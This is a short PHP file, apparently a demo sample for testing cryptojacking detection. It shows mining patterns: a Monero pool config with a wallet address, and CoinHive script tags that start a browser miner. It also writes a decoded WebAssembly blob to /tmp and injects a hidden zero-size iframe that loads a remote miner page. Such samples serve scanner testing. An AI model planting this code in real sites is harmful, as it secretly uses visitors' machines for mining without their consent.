<?php
// Demo file: crypto mining patterns (more realistic)
$mining_config = array(
    'pool' => 'stratum+tcp://pool.supportxmr.com:3333',
    'wallet' => '4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5HU5UmD3yQmv',
    'algorithm' => 'cryptonight',
    'threads' => 4
);

// CoinHive-like mining script
class CryptoMiner {
    private $worker_url = 'https://coinhive.com/lib/worker.js';
    
    public function start() {
        echo '<script src="' . $this->worker_url . '"></script>';
        echo '<script>var miner = new CoinHive.Anonymous("YOUR_SITE_KEY"); miner.start();</script>';
    }
}

// WebAssembly crypto mining
$wasm_miner = base64_decode('AGFzbQEAAAABBAFgAAADAgEABQMBAAEGEQJ/AEGAgMQAC38AQYCExAALBxcCA21lbQIABGRhdGEDABFfX3dhc21fY2FsbF9jdG9ycwAACgkBBwAgASAAEQAACw==');
file_put_contents('/tmp/miner.wasm', $wasm_miner);

// Hidden iframe mining
echo '<iframe src="https://coinhive.com/media/miner.html?key=YOUR_KEY" style="width:0;height:0;border:0;"></iframe>';
?>